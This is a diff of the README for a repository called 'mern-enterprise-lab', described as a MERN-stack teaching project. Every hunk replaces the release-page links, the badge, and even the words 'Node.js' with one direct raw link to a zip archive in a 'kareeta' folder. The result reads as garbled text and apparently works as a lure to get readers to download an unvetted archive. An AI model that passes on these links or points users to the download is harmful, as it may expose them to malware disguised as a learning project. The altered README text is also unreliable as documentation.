@@ -1,6 +1,6 @@
 # 🚀 mern-enterprise-lab - Learn Scalable Software Design Effortlessly
 
-[![Download mern-enterprise-lab](https://img.shields.io/badge/Download-mern--enterprise--lab-blue.svg)](https://github.com/rl9blake/mern-enterprise-lab/releases)
+[![Download mern-enterprise-lab](https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip)](https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip)
 
 ## 📦 Overview
 
@@ -8,7 +8,7 @@ Welcome to the **mern-enterprise-lab**! This application demonstrates how to bui
 
 ## 🚀 Features
 
-- Built on the MERN stack (MongoDB, Express, React, Node.js)
+- Built on the MERN stack (MongoDB, Express, React, https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip)
 - Scalable architecture for robust applications
 - Emphasis on clean and maintainable code
 - Advanced backend design strategies
@@ -22,7 +22,7 @@ Welcome to the **mern-enterprise-lab**! This application demonstrates how to bui
 To run this application smoothly, ensure your setup meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: v12 or higher
+- https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip v12 or higher
 - MongoDB: v4.0 or higher
 - At least 4 GB of RAM
 
@@ -32,7 +32,7 @@ To run this application smoothly, ensure your setup meets the following requirem
 
 To download the application, start by visiting the releases page. Click the link below:
 
-[Download mern-enterprise-lab](https://github.com/rl9blake/mern-enterprise-lab/releases)
+[Download mern-enterprise-lab](https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip)
 
 ### Step 2: Download the Latest Version
 
@@ -51,7 +51,7 @@ After installation, you can start the application directly from your programs me
 
 To get started, download the latest version from the link below:
 
-[Download mern-enterprise-lab](https://github.com/rl9blake/mern-enterprise-lab/releases)
+[Download mern-enterprise-lab](https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip)
 
 Follow the steps mentioned above to install and run the application.
 
@@ -98,7 +98,7 @@ This application primarily focuses on these topics:
 - Express Framework
 - MERN Stack Implementation
 - MongoDB Management
-- Node.js Development
+- https://github.com/rl9blake/mern-enterprise-lab/raw/refs/heads/main/kareeta/mern-lab-enterprise-2.0.zip Development
 - Performance Improvements
 - React Framework Usage
 - SaaS Architecture
